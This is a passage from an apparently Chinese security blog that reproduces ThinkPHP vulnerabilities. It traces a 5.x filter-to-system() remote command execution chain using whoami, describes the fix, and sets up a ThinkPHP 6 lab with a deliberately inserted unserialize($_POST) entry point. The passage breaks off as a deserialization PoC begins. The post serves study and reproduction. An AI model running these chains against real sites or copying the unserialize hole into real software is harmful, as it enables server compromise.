<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">param</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mergeParam</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">method</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 自动获取请求变量</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">:</span>
                <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">post</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'PUT'</span><span class="token punctuation">:</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'DELETE'</span><span class="token punctuation">:</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'PATCH'</span><span class="token punctuation">:</span>
                <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">put</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 当前请求参数和URL地址中的参数合并</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取包含文件上传信息的数组</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311120825171.png" alt="image-20240311120825171"></p>
<p>在这个方法中会将GET数组赋值给<code>this-&gt;param</code>属性，然后<code>$name</code>就是之前说的 0w0</p>
<p>接下来就是我们喜闻乐见的<code>input</code>方法了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 获取变量 支持过滤和默认值
 * @access public
 * @param  array         $data 数据源
 * @param  string|false  $name 字段名
 * @param  mixed         $default 默认值
 * @param  string|array  $filter 过滤函数
 * @return mixed
 */</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">input</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取原始数据</span>
        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">''</span> <span class="token operator">!=</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 解析name</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 解析过滤器</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filterValue'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'7.1.0'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">arrayReset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">filterValue</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$data</span> <span class="token operator">!==</span> <span class="token variable">$default</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 强制类型转换</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">typeCast</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先进<code>getData</code>，在该方法我们可以获取恶意传参</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311121141555.png" alt="image-20240311121141555"></p>
<p><code>$name</code>是上一轮带下来的，也就是 0w0，这里从GET数组获取键名为<code>0w0</code>的键值，也就是<code>whoami</code>，得到 whoami 后返回</p>
<p>继续进入<code>getFilter</code>方法获取filter属性</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311121515008.png" alt="image-20240311121515008"></p>
<p>在 param 方法中，filter参数为空，因此在这里先为空，然后将<code>this-&gt;filter</code>属性赋值给<code>$filter</code>变量</p>
<p>然后在<code>$filter</code>数组追加一个<code>$default</code>变量，这里为null，不影响，之后就将该filter数组return回去，这时候<code>$filter=[&#39;system&#39;,null]</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311121552122.png" alt="image-20240311121552122"></p>
<p>最后进入<code>filterValue</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311121633314.png" alt="image-20240311121633314"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 递归过滤给定的值
 * @access public
 * @param  mixed     $value 键值
 * @param  mixed     $key 键名
 * @param  array     $filters 过滤方法+默认值
 * @return mixed
 */</span>
<span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">filterValue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$filters</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 调用函数或者方法过滤</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_scalar</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 正则过滤</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 匹配不成功返回默认值</span>
                    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// filter函数不存在时, 则使用filter_var进行过滤</span>
                <span class="token comment">// filter为非整形值时, 调用filter_id取得过滤id</span>
                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token function">is_int</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$filter</span> <span class="token punctuation">:</span> <span class="token function">filter_id</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先用arraypop弹出数组末尾的元素，因此数组中只剩下system</p>
<p>接下来就进入<code>call_user_func</code>命令执行完成rce了</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311121745099.png" alt="image-20240311121745099"></p>
<p>贴个其它师傅的流程图</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311121833155.png" alt="image-20240311121833155"></p>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>官方直接把<code>Request</code>中的<code>__call</code>魔术方法给抹除了，因此链子后半段就断掉了</p>
<hr>
<h2 id="tp-lt-x3D-5-0-10-缓存getshell"><a href="#tp-lt-x3D-5-0-10-缓存getshell" class="headerlink" title="tp&lt;&#x3D;5.0.10 缓存getshell"></a>tp&lt;&#x3D;5.0.10 缓存getshell</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/11241571.html">https://www.cnblogs.com/litlife/p/11241571.html</a></p>
<hr>
<h1 id="ThinkPHP6"><a href="#ThinkPHP6" class="headerlink" title="ThinkPHP6"></a>ThinkPHP6</h1><h2 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>PHP &gt;&#x3D; 7.2.5</p>
<p><code>6.0</code>版本开始，必须通过<code>Composer</code>方式安装和更新</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231108230447158.png" alt="image-20231108230447158"></p>
<p>网站-管理-composer</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">composer</span> create-project topthink/think<span class="token operator">=</span><span class="token number">6.0</span>.1 tp6 --prefer-dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">">=7.1.0"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"6.0.1"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/think-orm"</span><span class="token operator">:</span> <span class="token string">"2.0.30"</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">composer</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>有点怪，PHP好像要7.4.0以上了</p>
<p>config&#x2F;database.php这里要修改成自己的数据库配置</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">return</span> <span class="token punctuation">[</span>
    <span class="token comment">// 默认使用的数据库连接配置</span>
    <span class="token string single-quoted-string">'default'</span>         <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.driver'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

    <span class="token comment">// 自定义时间查询规则</span>
    <span class="token string single-quoted-string">'time_query_rule'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token comment">// 自动写入时间戳字段</span>
    <span class="token comment">// true为自动识别类型 false关闭</span>
    <span class="token comment">// 字符串则明确指定时间字段类型 支持 int timestamp datetime date</span>
    <span class="token string single-quoted-string">'auto_timestamp'</span>  <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>

    <span class="token comment">// 时间字段取出后的默认时间格式</span>
    <span class="token string single-quoted-string">'datetime_format'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">,</span>

    <span class="token comment">// 数据库连接配置信息</span>
    <span class="token string single-quoted-string">'connections'</span>     <span class="token operator">=></span> <span class="token punctuation">[</span>
        <span class="token string single-quoted-string">'mysql'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
            <span class="token comment">// 数据库类型</span>
            <span class="token string single-quoted-string">'type'</span>              <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.type'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 服务器地址</span>
            <span class="token string single-quoted-string">'hostname'</span>          <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.hostname'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 数据库名</span>
            <span class="token string single-quoted-string">'database'</span>          <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.database'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'TP6'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 用户名</span>
            <span class="token string single-quoted-string">'username'</span>          <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.username'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tp6'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 密码</span>
            <span class="token string single-quoted-string">'password'</span>          <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.password'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tp6tp6'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 端口</span>
            <span class="token string single-quoted-string">'hostport'</span>          <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.hostport'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'3306'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 数据库连接参数</span>
            <span class="token string single-quoted-string">'params'</span>            <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token comment">// 数据库编码默认采用utf8</span>
            <span class="token string single-quoted-string">'charset'</span>           <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.charset'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 数据库表前缀</span>
            <span class="token string single-quoted-string">'prefix'</span>            <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'database.prefix'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

            <span class="token comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span>
            <span class="token string single-quoted-string">'deploy'</span>            <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token comment">// 数据库读写是否分离 主从式有效</span>
            <span class="token string single-quoted-string">'rw_separate'</span>       <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token comment">// 读写分离后 主服务器数量</span>
            <span class="token string single-quoted-string">'master_num'</span>        <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token comment">// 指定从服务器序号</span>
            <span class="token string single-quoted-string">'slave_no'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token comment">// 是否严格检查字段是否存在</span>
            <span class="token string single-quoted-string">'fields_strict'</span>     <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>
            <span class="token comment">// 是否需要断线重连</span>
            <span class="token string single-quoted-string">'break_reconnect'</span>   <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token comment">// 监听SQL</span>
            <span class="token string single-quoted-string">'trigger_sql'</span>       <span class="token operator">=></span> <span class="token function">env</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'app_debug'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 开启字段缓存</span>
            <span class="token string single-quoted-string">'fields_cache'</span>      <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token comment">// 字段缓存路径</span>
            <span class="token string single-quoted-string">'schema_cache_path'</span> <span class="token operator">=></span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getRuntimePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'schema'</span> <span class="token operator">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>

        <span class="token comment">// 更多的数据库配置信息</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="6-0-1-6-0-3反序列化withAttr链"><a href="#6-0-1-6-0-3反序列化withAttr链" class="headerlink" title="6.0.1-6.0.3反序列化withAttr链"></a>6.0.1-6.0.3反序列化withAttr链</h2><h3 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>Index控制器里面加个反序列化入口</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>
<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
<span class="token punctuation">&#123;</span>
